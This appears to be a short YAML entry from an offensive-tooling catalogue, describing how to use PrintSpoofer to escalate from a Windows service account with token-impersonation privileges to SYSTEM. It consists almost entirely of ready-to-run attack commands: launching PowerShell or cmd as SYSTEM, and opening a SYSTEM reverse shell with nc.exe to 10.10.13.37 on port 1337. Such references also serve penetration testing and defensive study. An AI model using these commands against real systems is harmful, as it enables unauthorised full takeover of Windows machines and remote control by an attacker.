---
functions:
  privilege-escalation:
    - description: Leverage a service account with impersonatetoken and assignprimarytoken to get system on Windows 10 and Server 2016/2019
      code: |
        Run PowerShell as SYSTEM in the current console
          PrintSpoofer.exe -i -c powershell.exe
        Spawn a SYSTEM command prompt on the desktop of the session 1
          PrintSpoofer.exe -d 1 -c cmd.exe
        Get a SYSTEM reverse shell
          PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
resources: |
  https://github.com/itm4n/PrintSpoofer
---
